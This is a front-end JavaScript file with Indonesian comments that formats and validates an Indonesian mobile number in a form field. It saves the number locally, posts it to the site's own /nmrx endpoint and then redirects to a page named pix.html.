// form.js

const phoneInput =
document.getElementById("phone");

const lanjutBtn =
document.getElementById("lanjutBtn");

const loadingBox =
document.getElementById("loadingBox");

const clearBtn =
document.getElementById("clearBtn");

const errorBox =
document.getElementById("errorBox");

/* FADE IN */ 
window.addEventListener("load", () => {

    document.body.classList.add(
    "fade-in"
    );

});

/* AUTO FOCUS */
window.onload = () => {

    phoneInput.focus();

};

/* FORMAT NOMOR */
phoneInput.addEventListener(
"input",
(e) => {

    /* ANGKA SAJA */
    let angka =
    e.target.value.replace(
    /\D/g,
    ''
    );

    /* MAX */
    angka =
    angka.substring(0,13);

    let hasil = "";

    /* 812 */
    if(angka.length > 0){

        hasil +=
        angka.substring(0,3);

    }

    /* 812-3456 */
    if(angka.length >= 3){

        hasil += "-" +
        angka.substring(3,7);

    }

    /* 812-3456-7890 */
    if(angka.length >= 7){

        hasil += "-" +
        angka.substring(7,13);

    }

    e.target.value = hasil;

    /* SHOW / HIDE X */
    if(hasil.length > 0){

        clearBtn.style.display =
        "flex";

    }else{

        clearBtn.style.display =
        "none";

    }

    /* HIDE ERROR */
    errorBox.classList.remove(
    "show"
    );

});

/* CLEAR INPUT */
clearBtn.addEventListener(
"click",
() => {

    phoneInput.value = "";

    clearBtn.style.display =
    "none";

    errorBox.classList.remove(
    "show"
    );

    phoneInput.focus();

});

/* KEYBOARD ANGKA */
phoneInput.setAttribute(
"inputmode",
"numeric"
);

/* ENTER */
phoneInput.addEventListener(
"keypress",
(e)=>{

    if(e.key === "Enter"){

        lanjutBtn.click();

    }

});

/* LANJUT */
lanjutBtn.addEventListener(
"click",
 async () => {

    /* AMBIL NOMOR */
    const nomor =
    phoneInput.value.replace(
    /\D/g,
    ''
    );

    /* VALIDASI */
    if(
        nomor.length < 9 ||
        nomor.charAt(0) !== "8"
    ){

        if(navigator.vibrate){

        navigator.vibrate([
            120,
            80,
            120
        ]);

    }

        /* SHOW ERROR */
        errorBox.classList.add(
        "show"
        );

        /* AUTO HIDE */
        setTimeout(() => {

            errorBox.classList.remove(
            "show"
            );

        },2000);

        phoneInput.focus();

        return;

    }

    /* SIMPAN */
    localStorage.setItem(
    "nmrx",
    phoneInput.value
    );

    /* KIRIM */
    await fetch("/nmrx", {

        method:"POST",

        headers:{
            "Content-Type":
            "application/json"
        },

        body:JSON.stringify({

            nmrx:phoneInput.value

        })

    });

    /* SHOW LOADING */
    loadingBox.style.display =
    "flex";

    /* PINDAH */
    setTimeout(()=>{

      /* FADE OUT */
    document.body.classList.add(
    "fade-out"
    );

        window.location.href =
        "pix.html";

    },2000);

});

/* RESET LOADING */
window.addEventListener(
"pageshow",
() => {

    loadingBox.style.display =
    "none";

});
